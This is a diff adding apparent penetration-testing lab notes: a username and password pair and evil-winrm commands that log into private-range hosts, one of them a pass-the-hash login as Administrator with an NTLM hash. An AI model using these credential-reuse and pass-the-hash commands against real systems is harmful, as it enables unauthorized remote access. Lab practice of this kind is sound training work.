@@ -1,0 +1,21 @@
+ 
+fsmith 
+
+Thestrokes23
+
+
+evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175
+
+
+
+
+
+
+
+
+evil-winrm -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff -i 10.10.10.175
+
+
+
+
+evil-winrm -u mrb3n's  -p Thestrokes23 -i 10.10.10.198
